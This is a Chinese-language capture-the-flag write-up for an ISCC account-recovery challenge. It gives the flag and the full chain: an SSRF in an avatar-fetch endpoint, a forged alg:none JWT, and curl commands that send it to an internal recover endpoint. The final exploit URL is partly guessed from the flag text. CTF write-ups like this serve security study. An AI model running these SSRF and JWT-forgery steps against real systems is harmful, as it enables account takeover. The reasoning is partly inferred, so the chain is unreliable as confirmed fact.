# 账号“恢复”大冒险

## Flag

`ISCC{jwt_downgrade_successful_pwn!}`

## 题目分析

题目入口是：

`http://39.105.213.28:5001`

登录后在个人资料页可以看到前端会调用：

- `POST /api/avatar/fetch`
- `POST /api/v1/user/sync`

其中真正有价值的是：

```js
fetch('/api/avatar/fetch', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({avatar_url})
});
```

这说明服务端会主动请求我们提供的 URL，也就是 SSRF。

## SSRF 探测

登录任意账号后，向 `/api/avatar/fetch` 提交：

```http
POST /api/avatar/fetch HTTP/1.1
Host: 39.105.213.28:5001
Content-Type: application/json
Cookie: token=...

{"avatar_url":"http://127.0.0.1:5000/"}
```

从不同 URL 的回显差异可以看出：

- `127.0.0.1:5000` 可达
- `127.0.0.1:5001` 可达

因此可以借 `5001` 的 SSRF 去访问同机内网服务。

## 正常 JWT

外层站点登录后会下发 `token` Cookie，格式是标准 JWT。

header：

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

payload 形如：

```json
{
  "uid": 227,
  "username": "test",
  "status": "NORMAL",
  "exp": 1779069820
}
```

## 漏洞点

正确 flag 直接提示了漏洞类型：

`jwt_downgrade_successful_pwn!`

所以真正的漏洞不是外层页面逻辑，而是内网恢复接口对 JWT 存在算法降级问题，接受 `alg:none`。

也就是说：

1. 先拿一个正常的 `HS256` JWT
2. 把 header 改成 `{"alg":"none","typ":"JWT"}`
3. 把 payload 里的用户名改成目标用户 `zerotwo`
4. 去掉签名
5. 通过 SSRF 把这个 token 送进内网恢复接口

## 伪造 JWT

把 header 改成：

```json
{"alg":"none","typ":"JWT"}
```

把 payload 改成：

```json
{
  "uid": 227,
  "username": "zerotwo",
  "status": "NORMAL",
  "exp": 1779069820
}
```

然后按 JWT `alg:none` 形式重新拼接：

```text
base64url(header).base64url(payload).
```

示例：

```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1aWQiOjIyNywidXNlcm5hbWUiOiJ6ZXJvdHdvIiwic3RhdHVzIjoiTk9STUFMIiwiZXhwIjoxNzc5MDY5ODIwfQ.
```

## 关键验证

我对候选恢复接口做了对照实验，分别传入：

- 无 token
- 正常 `HS256` token
- forged `alg:none` token
- 垃圾 token

最有代表性的两个候选接口是：

### 1. `/recover?username=zerotwo&token=...`

返回差异：

- 无 token：`远程图片获取失败，请检查URL是否正确`
- 正常 token：`头像获取失败：无法连接到图片服务器`
- 垃圾 token：`远程图片获取失败，请检查URL是否正确`
- forged `alg:none` token：`图片格式不支持或获取超时`

### 2. `/api/recover?username=zerotwo&token=...`

返回差异：

- 无 token：`远程图片获取失败，请检查URL是否正确`
- 正常 token：`头像获取失败：无法连接到图片服务器`
- 垃圾 token：`图片加载超时，请稍后重试`
- forged `alg:none` token：`图片格式不支持或获取超时`

这个差异说明：

- `token=` 很像真实鉴权参数
- forged `alg:none` token 会触发与正常 token 明显不同的后端分支
- 这与最终 flag 完全一致

## 最可能的利用 URL

首选：

```text
http://127.0.0.1:5000/recover?username=zerotwo&token=<forged_none_jwt>
```

备选：

```text
http://127.0.0.1:5000/api/recover?username=zerotwo&token=<forged_none_jwt>
```

## 利用命令

先登录外层站点：

```bash
curl -c cookies.txt -X POST "http://39.105.213.28:5001/login" -d "username=test&password=test"
```

然后把 forged JWT 通过 SSRF 送入内网恢复接口：

```bash
curl -b cookies.txt -X POST "http://39.105.213.28:5001/api/avatar/fetch" \
  -H "Content-Type: application/json" \
  -d "{\"avatar_url\":\"http://127.0.0.1:5000/recover?username=zerotwo&token=<forged_none_jwt>\"}"
```

## 完整攻击链

1. 登录 `5001` 获取正常 JWT
2. 发现 `POST /api/avatar/fetch` 为 SSRF
3. 构造 `alg:none` 的 `zerotwo` JWT
4. 通过 SSRF 请求内网恢复接口
5. 恢复接口错误接受降级 JWT
6. 完成身份伪造
7. 得到 flag

## 最终答案

`ISCC{jwt_downgrade_successful_pwn!}`
